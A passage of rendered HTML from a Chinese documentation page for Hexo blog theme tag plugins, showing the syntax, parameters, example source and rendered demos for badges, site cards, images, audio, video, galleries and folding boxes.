src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=calm&show_owner=true"/></a></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-13-github徽标-ghbdage">2.13 github徽标 ghbdage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage [right],[left],[logo]||[color],[link],[title]||[option] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>left</code>：徽标左边的信息，必选参数。</li><li><code>right</code>: 徽标右边的信息，必选参数，</li><li><code>logo</code>：徽标图标，图标名称详见<a href="https://simpleicons.org/">simpleicons</a>，可选参数。</li><li><code>color</code>：徽标右边的颜色，可选参数。</li><li><code>link</code>：指向的链接，可选参数。</li><li><code>title</code>：徽标的额外信息，可选参数。主要用于优化SEO，但<code>object</code>标签不会像<code>a</code>标签一样在鼠标悬停显示<code>title</code>信息。</li><li><code>option</code>：自定义参数，支持<a href="https://shields.io/">shields.io</a>的全部API参数支持，具体参数可以参看上文中的拓展写法示例。形式为<code>name1=value2&amp;name2=value2</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.基本参数,定义徽标左右文字和图标</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Theme,Butterfly %&#125;</span><br><span class="line">&#123;% bdage Frame,Hexo,hexo %&#125;</span><br></pre></td></tr></table></figure><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage CDN,JsDelivr,jsDelivr||abcdef,https://metroui.org.ua/index.html,本站使用JsDelivr为静态资源提供CDN加速 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割</span><br><span class="line">&#123;% bdage Source,GitHub,GitHub||,https://github.com/ %&#125;</span><br></pre></td></tr></table></figure><p>3.拓展参数，支持shields的API的全部参数内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Hosted,Vercel,Vercel||brightgreen,https://vercel.com/,本站采用双线部署，默认线路托管于Vercel||style=social&amp;logoWidth=20 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割</span><br><span class="line">&#123;% bdage Hosted,Vercel,Vercel||||style=social&amp;logoWidth=20&amp;logoColor=violet %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.基本参数,定义徽标左右文字和图标</p><p><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Butterfly-Theme-orange?logo=&color=orange&link=&"></object><br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Hexo-Frame-orange?logo=hexo&color=orange&link=&"></object></p><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><p><object class="ghbdage" style="margin-inline:5px" title="本站使用JsDelivr为静态资源提供CDN加速" standby="loading..." data="https://img.shields.io/badge/JsDelivr-CDN-orange?logo=jsDelivr&color=abcdef&link=https://metroui.org.ua/index.html&"></object><br>//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/GitHub-Source-orange?logo=GitHub&color=orange&link=https://github.com/&"></object></p><p>3.拓展参数，支持shields的API的全部参数内容</p><p><object class="ghbdage" style="margin-inline:5px" title="本站采用双线部署，默认线路托管于Vercel" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=brightgreen&link=https://vercel.com/&style=social&logoWidth=20"></object><br>//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=orange&link=&style=social&logoWidth=20&logoColor=violet"></object></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-14-网站卡片-sites">2.14 网站卡片 sites</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site xaoxuu, url=https://xaoxuu.com, screenshot=https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg, avatar=https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png, description=简约风格 %&#125;</span><br><span class="line">&#123;% site inkss, url=https://inkss.cn, screenshot=https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg, avatar=https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site MHuiG, url=https://blog.mhuig.top, screenshot=https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png, avatar=https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Colsrch, url=https://colsrch.top, screenshot=https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png, avatar=https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Linhk1606, url=https://linhk1606.github.io, screenshot=https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png, avatar=https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="site-card-group"><a class="site-card" href="https://fomalhaut1998.com"><div class="img"><img src="https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png"/><span class="title">fomalhaut1998</span><span class="desc">简约风格</span></div></a><a class="site-card" href="https://inkss.cn"><div class="img"><img src="https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg"/><span class="title">inkss</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://blog.mhuig.top"><div class="img"><img src="https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png"/><span class="title">MHuiG</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://colsrch.top"><div class="img"><img src="https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg"/><span class="title">Colsrch</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://linhk1606.github.io"><div class="img"><img src="https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png"/></div><div class="info"><img src="https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png"/><span class="title">Linhk1606</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-15-行内图片-inlineimage">2.15 行内图片 inlineimage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% inlineimage 图片链接, height=高度（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>高度</code>：height=20px</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif %&#125; 一段话。</span><br><span class="line"></span><br><span class="line">这又是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif, height=40px %&#125; 一段话。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>这是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif" style="height:1.5em"/> 一段话。</p><p>这又是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif" style="height:40px;"/> 一段话。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-16-单张图片-image">2.16 单张图片 image</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image 链接, width=宽度（可选）, height=高度（可选）, alt=描述（可选）, bg=占位颜色（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>图片宽度高度：width=300px, height=32px</li><li>图片描述：alt=图片描述（butterfly需要在主题配置文件中开启图片描述）</li><li>占位背景色：bg=#f2f2f2</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>2.指定宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px %&#125;</span><br></pre></td></tr></table></figure><p>3.指定宽度并添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>4.设置占位背景色：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, bg=#1D0C04, alt=优化不同宽度浏览的观感 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.添加描述：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div>2..指定宽度<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" style="width:400px;"/></div></div>3.指定宽度并添加描述：<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。" style="width:400px;"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div>4.设置占位背景色：<div class="img-wrap"><div class="img-bg" style="background:#1D0C04"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="优化不同宽度浏览的观感" style="width:400px;"/></div><span class="image-caption">优化不同宽度浏览的观感</span></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-17-音频-audio">2.17 音频 audio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio 音频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="audio"><audio controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-18-视频-video">2.18 视频 video</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video 视频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>对齐方向</code>：left, center, right</li><li><code>列数</code>：逗号后面直接写列数，支持 1 ～ 4 列。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.100%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br></pre></td></tr></table></figure><p>2.50%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 2 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><p>3.25%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 4 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.100%宽度</p><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div>2.50%宽度<div class="videos" col='2'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div>3.25%宽度<div class="videos" col='4'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-19-相册-gallery">2.19 相册 gallery</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">markdown 圖片格式</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>gallerygroup 相册图库</li></ul><table><thead><tr><th>参数名</th><th>释义</th></tr></thead><tbody><tr><td>name</td><td>图库名字</td></tr><tr><td>description</td><td>图库描述</td></tr><tr><td>link</td><td>链接到对应相册的地址</td></tr><tr><td>img-url</td><td>图库封面</td></tr></tbody></table><ul><li><p>gallery 相册</p><p>区别于旧版的Gallery相册,新的Gallery相册会自动根据图片长度进行排版，书写也更加方便，与markdown格式一样。可根据需要插入到相应的md。无需再自己配置长宽。<strong>建议在粘贴时故意使用长短、大小、横竖不一的图片</strong>，会有更好的效果。（尺寸完全相同的图片只会平铺输出，效果很糟糕）</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup MC 在Rikkaの六花服务器里留下的足迹 &#x27;/gallery/MC/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg %&#125;</span><br><span class="line">&#123;% galleryGroup Gundam 哦咧哇gundam哒！ &#x27;/gallery/Gundam/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png %&#125;</span><br><span class="line">&#123;% galleryGroup I-am-Akilar 某种意义上也算自拍吧 &#x27;/gallery/I-am-Akilar/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg</span>)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.gallerygroup 相册图库</p><div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">MC</div>  <p>在Rikkaの六花服务器里留下的足迹</p>  <a href='/gallery/MC/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">Gundam</div>  <p>哦咧哇gundam哒！</p>  <a href='/gallery/Gundam/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">I-am-Akilar</div>  <p>某种意义上也算自拍吧</p>  <a href='/gallery/I-am-Akilar/'></a>  </figcaption>  </figure></div>2.gallery 相册<div class="fj-gallery"><p><img src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg" alt=""></p>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-20-折叠框-folding">2.20 折叠框 folding</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 参数（可选）, 标题 %&#125;</span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><!-- tab 参数配置 --><ol><li><p><code>颜色</code>：blue, cyan, green, yellow, red</p></li><li><p><code>状态</code>：状态填写 open 代表默认打开。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll 